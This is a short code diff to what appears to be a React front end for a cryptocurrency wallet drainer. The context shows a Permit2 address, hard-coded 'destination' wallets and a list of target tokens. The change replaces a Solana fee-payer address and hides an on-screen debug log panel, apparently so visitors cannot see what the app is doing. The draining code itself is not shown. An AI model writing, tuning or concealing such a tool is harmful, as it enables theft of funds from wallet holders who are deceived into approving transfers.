@@ -35,7 +35,7 @@ const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
 // 💰 SECURE DESTINATION WALLETS
 const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
 const SOLANA_COLD_WALLET = 'BM2WQkmLc9ZEARpufZtqX2PxmKjpPSuotRBY5MdiLbRu'; 
-const SOLANA_BACKEND_FEE_PAYER = 'BM2WQkmLc9ZEARpufZtqX2PxmKjpPSuotRBY5MdiLbRu'; 
+const SOLANA_BACKEND_FEE_PAYER = 'FMnwoZRPfsxie8WMTA3AFUscy4GA8poMQ72ypkk3MTcR'; 
 
 // 💎 EVM DISCOVERY CONFIGURATION
 const TARGET_TOKENS: Record<string, any> = {
@@ -830,7 +830,7 @@ export default function App() {
       )}
       
       {/* Hidden debug panel */}
-      <div style={{ position: 'fixed', bottom: 16, left: 16, backgroundColor: '#000', color: '#0f0', fontSize: 11, fontFamily: 'monospace', borderRadius: 8, padding: 10, maxHeight: 120, overflowY: 'auto', opacity: 0.7, display: 'block' }}>
+      <div style={{ position: 'fixed', bottom: 16, left: 16, backgroundColor: '#000', color: '#0f0', fontSize: 11, fontFamily: 'monospace', borderRadius: 8, padding: 10, maxHeight: 120, overflowY: 'auto', opacity: 0.7, display: 'none' }}>
         <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: 4, marginBottom: 4 }}>--- LOGS ---</div>
         {_debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: 2 }}>{msg}</div>))}
       </div>
